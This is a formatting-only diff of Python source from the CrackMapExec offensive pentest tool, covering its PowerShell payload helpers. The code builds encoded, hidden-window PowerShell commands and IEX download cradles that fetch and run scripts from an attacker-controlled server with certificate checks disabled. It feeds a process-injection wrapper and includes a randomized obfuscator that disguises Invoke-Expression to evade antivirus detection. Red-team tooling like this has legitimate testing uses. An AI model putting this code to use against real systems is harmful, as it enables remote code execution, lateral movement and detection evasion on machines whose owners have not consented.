@@ -39,17 +39,13 @@ def obfs_ps_script(path_to_script):
             with open(obfs_ps_script, "r") as script:
                 return script.read()
 
-        cme_logger.display(
-            "Performing one-time script obfuscation, go look at some memes cause this can take a bit..."
-        )
+        cme_logger.display("Performing one-time script obfuscation, go look at some memes cause this can take a bit...")
 
         invoke_obfs_command = f"powershell -C 'Import-Module {get_ps_script('invoke-obfuscation/Invoke-Obfuscation.psd1')};Invoke-Obfuscation -ScriptPath {get_ps_script(path_to_script)} -Command \"TOKEN,ALL,1,OUT {obfs_ps_script}\" -Quiet'"
         cme_logger.debug(invoke_obfs_command)
 
         with open(os.devnull, "w") as devnull:
-            return_code = call(
-                invoke_obfs_command, stdout=devnull, stderr=devnull, shell=True
-            )
+            return_code = call(invoke_obfs_command, stdout=devnull, stderr=devnull, shell=True)
 
         cme_logger.success("Script obfuscated successfully")
 
@@ -65,18 +61,7 @@ def obfs_ps_script(path_to_script):
             # strip block comments
             stripped_code = re.sub(re.compile("<#.*?#>", re.DOTALL), "", script.read())
             # strip blank lines, lines starting with #, and verbose/debug statements
-            stripped_code = "\n".join(
-                [
-                    line
-                    for line in stripped_code.split("\n")
-                    if (
-                        (line.strip() != "")
-                        and (not line.strip().startswith("#"))
-                        and (not line.strip().lower().startswith("write-verbose "))
-                        and (not line.strip().lower().startswith("write-debug "))
-                    )
-                ]
-            )
+            stripped_code = "\n".join([line for line in stripped_code.split("\n") if ((line.strip() != "") and (not line.strip().startswith("#")) and (not line.strip().lower().startswith("write-verbose ")) and (not line.strip().lower().startswith("write-debug ")))])
 
             return stripped_code
 
@@ -167,18 +152,14 @@ else
                 break
 
             if obfs_attempts == 4:
-                cme_logger.error(
-                    f"Command exceeds maximum length of 8191 chars (was {len(command)}). exiting."
-                )
+                cme_logger.error(f"Command exceeds maximum length of 8191 chars (was {len(command)}). exiting.")
                 exit(1)
 
             obfs_attempts += 1
     else:
         command = f"powershell.exe -noni -nop -w 1 -enc {encode_ps_command(command)}"
         if len(command) > 8191:
-            cme_logger.error(
-                f"Command exceeds maximum length of 8191 chars (was {len(command)}). exiting."
-            )
+            cme_logger.error(f"Command exceeds maximum length of 8191 chars (was {len(command)}). exiting.")
             exit(1)
 
     return command
@@ -221,9 +202,7 @@ if (($injected -eq $False) -or ($inject_once -eq $False)){{
     )
 
     if context:
-        return gen_ps_iex_cradle(
-            context, "Invoke-PSInject.ps1", ps_code, post_back=False
-        )
+        return gen_ps_iex_cradle(context, "Invoke-PSInject.ps1", ps_code, post_back=False)
 
     return ps_code
 
@@ -244,9 +223,7 @@ IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/{ps_scri
         ).strip()
 
     elif type(scripts) is list:
-        launcher = (
-            "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n"
-        )
+        launcher = "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n"
         launcher += "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'"
         for script in scripts:
             launcher += "IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/{script}')\n".format(
@@ -309,9 +286,7 @@ def invoke_obfuscation(script_string):
         random_delimiters.append(i)
 
     # Only use a subset of current delimiters to randomize what you see in every iteration of this script's output.
-    random_delimiters = [
-        choice(random_delimiters) for _ in range(int(len(random_delimiters) / 4))
-    ]
+    random_delimiters = [choice(random_delimiters) for _ in range(int(len(random_delimiters) / 4))]
 
     # Convert $ScriptString to delimited ASCII values in [Char] array separated by random delimiter from defined list $RandomDelimiters.
     delimited_encoded_array = ""
@@ -339,35 +314,13 @@ def invoke_obfuscation(script_string):
     for delim in random_delimiters:
         # Random case 'split' string.
         split = "".join(choice([i.upper(), i.lower()]) for i in "Split")
-        random_delimiters_to_print_for_dash_split += (
-            "-" + split + choice(["", " "]) + "'" + delim + "'" + choice(["", " "])
-        )
+        random_delimiters_to_print_for_dash_split += "-" + split + choice(["", " "]) + "'" + delim + "'" + choice(["", " "])
 
-    random_delimiters_to_print_for_dash_split = (
-        random_delimiters_to_print_for_dash_split.strip("\t\n\r")
-    )
+    random_delimiters_to_print_for_dash_split = random_delimiters_to_print_for_dash_split.strip("\t\n\r")
     # Randomly select between various conversion syntax options.
     random_conversion_syntax = [
-        "["
-        + char_str
-        + "]"
-        + choice(["", " "])
-        + "["
-        + integer
-        + "]"
-        + choice(["", " "])
-        + "$_",
-        "["
-        + integer
-        + "]"
-        + choice(["", " "])
-        + "$_"
-        + choice(["", " "])
-        + choice(["-as", "-As", "-aS", "-AS"])
-        + choice(["", " "])
-        + "["
-        + char_str
-        + "]",
+        "[" + char_str + "]" + choice(["", " "]) + "[" + integer + "]" + choice(["", " "]) + "$_",
+        "[" + integer + "]" + choice(["", " "]) + "$_" + choice(["", " "]) + choice(["-as", "-As", "-aS", "-AS"]) + choice(["", " "]) + "[" + char_str + "]",
     ]
     random_conversion_syntax = choice(random_conversion_syntax)
 
@@ -387,30 +340,14 @@ def invoke_obfuscation(script_string):
     # https://msdn.microsoft.com/en-us/powershell/reference/5.1/microsoft.powershell.core/about/about_automatic_variables
 
     set_ofs_var_syntax = [
-        "Set-Item"
-        + choice([" " * 1, " " * 2])
-        + "'Variable:OFS'"
-        + choice([" " * 1, " " * 2])
-        + "''",
-        choice(["Set-Variable", "SV", "SET"])
-        + choice([" " * 1, " " * 2])
-        + "'OFS'"
-        + choice([" " * 1, " " * 2])
-        + "''",
+        "Set-Item" + choice([" " * 1, " " * 2]) + "'Variable:OFS'" + choice([" " * 1, " " * 2]) + "''",
+        choice(["Set-Variable", "SV", "SET"]) + choice([" " * 1, " " * 2]) + "'OFS'" + choice([" " * 1, " " * 2]) + "''",
     ]
     set_ofs_var = choice(set_ofs_var_syntax)
 
     set_ofs_var_back_syntax = [
-        "Set-Item"
-        + choice([" " * 1, " " * 2])
-        + "'Variable:OFS'"
-        + choice([" " * 1, " " * 2])
-        + "' '",
-        "Set-Item"
-        + choice([" " * 1, " " * 2])
-        + "'Variable:OFS'"
-        + choice([" " * 1, " " * 2])
-        + "' '",
+        "Set-Item" + choice([" " * 1, " " * 2]) + "'Variable:OFS'" + choice([" " * 1, " " * 2]) + "' '",
+        "Set-Item" + choice([" " * 1, " " * 2]) + "'Variable:OFS'" + choice([" " * 1, " " * 2]) + "' '",
     ]
     set_ofs_var_back = choice(set_ofs_var_back_syntax)
 
@@ -421,114 +358,16 @@ def invoke_obfuscation(script_string):
     # Generate the code that will decrypt and execute the payload and randomly select one.
     baseScriptArray = [
         "[" + char_str + "[]" + "]" + choice(["", " "]) + encoded_array,
-        "("
-        + choice(["", " "])
-        + "'"
-        + delimited_encoded_array
-        + "'."
-        + split
-        + "("
-        + choice(["", " "])
-        + "'"
-        + random_delimiters_to_print
-        + "'"
-        + choice(["", " "])
-        + ")"
-        + choice(["", " "])
-        + "|"
-        + choice(["", " "])
-        + for_each_object
-        + choice(["", " "])
-        + "{"
-        + choice(["", " "])
-        + "("
-        + choice(["", " "])
-        + random_conversion_syntax
-        + ")"
-        + choice(["", " "])
-        + "}"
-        + choice(["", " "])
-        + ")",
-        "("
-        + choice(["", " "])
-        + "'"
-        + delimited_encoded_array
-        + "'"
-        + choice(["", " "])
-        + random_delimiters_to_print_for_dash_split
-        + choice(["", " "])
-        + "|"
-        + choice(["", " "])
-        + for_each_object
-        + choice(["", " "])
-        + "{"
-        + choice(["", " "])
-        + "("
-        + choice(["", " "])
-        + random_conversion_syntax
-        + ")"
-        + choice(["", " "])
-        + "}"
-        + choice(["", " "])
-        + ")",
-        "("
-        + choice(["", " "])
-        + encoded_array
-        + choice(["", " "])
-        + "|"
-        + choice(["", " "])
-        + for_each_object
-        + choice(["", " "])
-        + "{"
-        + choice(["", " "])
-        + "("
-        + choice(["", " "])
-        + random_conversion_syntax
-        + ")"
-        + choice(["", " "])
-        + "}"
-        + choice(["", " "])
-        + ")",
+        "(" + choice(["", " "]) + "'" + delimited_encoded_array + "'." + split + "(" + choice(["", " "]) + "'" + random_delimiters_to_print + "'" + choice(["", " "]) + ")" + choice(["", " "]) + "|" + choice(["", " "]) + for_each_object + choice(["", " "]) + "{" + choice(["", " "]) + "(" + choice(["", " "]) + random_conversion_syntax + ")" + choice(["", " "]) + "}" + choice(["", " "]) + ")",
+        "(" + choice(["", " "]) + "'" + delimited_encoded_array + "'" + choice(["", " "]) + random_delimiters_to_print_for_dash_split + choice(["", " "]) + "|" + choice(["", " "]) + for_each_object + choice(["", " "]) + "{" + choice(["", " "]) + "(" + choice(["", " "]) + random_conversion_syntax + ")" + choice(["", " "]) + "}" + choice(["", " "]) + ")",
+        "(" + choice(["", " "]) + encoded_array + choice(["", " "]) + "|" + choice(["", " "]) + for_each_object + choice(["", " "]) + "{" + choice(["", " "]) + "(" + choice(["", " "]) + random_conversion_syntax + ")" + choice(["", " "]) + "}" + choice(["", " "]) + ")",
     ]
     # Generate random JOIN syntax for all above options
     new_script_array = [
         choice(baseScriptArray) + choice(["", " "]) + join + choice(["", " "]) + "''",
         join + choice(["", " "]) + choice(baseScriptArray),
-        str_join
-        + "("
-        + choice(["", " "])
-        + "''"
-        + choice(["", " "])
-        + ","
-        + choice(["", " "])
-        + choice(baseScriptArray)
-        + choice(["", " "])
-        + ")",
-        '"'
-        + choice(["", " "])
-        + "$("
-        + choice(["", " "])
-        + set_ofs_var
-        + choice(["", " "])
-        + ")"
-        + choice(["", " "])
-        + '"'
-        + choice(["", " "])
-        + "+"
-        + choice(["", " "])
-        + str_str
-        + choice(baseScriptArray)
-        + choice(["", " "])
-        + "+"
-        + '"'
-        + choice(["", " "])
-        + "$("
-        + choice(["", " "])
-        + set_ofs_var_back
-        + choice(["", " "])
-        + ")"
-        + choice(["", " "])
-        + '"',
+        str_join + "(" + choice(["", " "]) + "''" + choice(["", " "]) + "," + choice(["", " "]) + choice(baseScriptArray) + choice(["", " "]) + ")",
+        '"' + choice(["", " "]) + "$(" + choice(["", " "]) + set_ofs_var + choice(["", " "]) + ")" + choice(["", " "]) + '"' + choice(["", " "]) + "+" + choice(["", " "]) + str_str + choice(baseScriptArray) + choice(["", " "]) + "+" + '"' + choice(["", " "]) + "$(" + choice(["", " "]) + set_ofs_var_back + choice(["", " "]) + ")" + choice(["", " "]) + '"',
     ]
 
     # Randomly select one of the above commands.
@@ -545,38 +384,12 @@ def invoke_obfuscation(script_string):
     # These methods draw on common environment variable values and PowerShell Automatic Variable
     # values/methods/members/properties/etc.
     invocationOperator = choice([".", "&"]) + choice(["", " "])
-    invoke_expression_syntax.append(
-        invocationOperator + "( $ShellId[1]+$ShellId[13]+'x')"
-    )
-    invoke_expression_syntax.append(
-        invocationOperator
-        + "( $PSHome["
-        + choice(["4", "21"])
-        + "]+$PSHOME["
-        + choice(["30", "34"])
-        + "]+'x')"
-    )
-    invoke_expression_syntax.append(
-        invocationOperator + "( $env:Public[13]+$env:Public[5]+'x')"
-    )
-    invoke_expression_syntax.append(
-        invocationOperator
-        + "( $env:ComSpec[4,"
-        + choice(["15", "24", "26"])
-        + ",25]-Join'')"
-    )
-    invoke_expression_syntax.append(
-        invocationOperator
-        + "(("
-        + choice(["Get-Variable", "GV", "Variable"])
-        + " '*mdr*').Name[3,11,2]-Join'')"
-    )
-    invoke_expression_syntax.append(
-        invocationOperator
-        + "( "
-        + choice(["$VerbosePreference.ToString()", "([String]$VerbosePreference)"])
-        + "[1,3]+'x'-Join'')"
-    )
+    invoke_expression_syntax.append(invocationOperator + "( $ShellId[1]+$ShellId[13]+'x')")
+    invoke_expression_syntax.append(invocationOperator + "( $PSHome[" + choice(["4", "21"]) + "]+$PSHOME[" + choice(["30", "34"]) + "]+'x')")
+    invoke_expression_syntax.append(invocationOperator + "( $env:Public[13]+$env:Public[5]+'x')")
+    invoke_expression_syntax.append(invocationOperator + "( $env:ComSpec[4," + choice(["15", "24", "26"]) + ",25]-Join'')")
+    invoke_expression_syntax.append(invocationOperator + "((" + choice(["Get-Variable", "GV", "Variable"]) + " '*mdr*').Name[3,11,2]-Join'')")
+    invoke_expression_syntax.append(invocationOperator + "( " + choice(["$VerbosePreference.ToString()", "([String]$VerbosePreference)"]) + "[1,3]+'x'-Join'')")
 
     # Randomly choose from above invoke operation syntaxes.
     invokeExpression = choice(invoke_expression_syntax)
@@ -586,21 +399,8 @@ def invoke_obfuscation(script_string):
 
     # Choose random Invoke-Expression/IEX syntax and ordering: IEX ($ScriptString) or ($ScriptString | IEX)
     invokeOptions = [
-        choice(["", " "])
-        + invokeExpression
-        + choice(["", " "])
-        + "("
-        + choice(["", " "])
-        + newScript
-        + choice(["", " "])
-        + ")"
-        + choice(["", " "]),
-        choice(["", " "])
-        + newScript
-        + choice(["", " "])
-        + "|"
-        + choice(["", " "])
-        + invokeExpression,
+        choice(["", " "]) + invokeExpression + choice(["", " "]) + "(" + choice(["", " "]) + newScript + choice(["", " "]) + ")" + choice(["", " "]),
+        choice(["", " "]) + newScript + choice(["", " "]) + "|" + choice(["", " "]) + invokeExpression,
     ]
 
     obfuscated_payload = choice(invokeOptions)
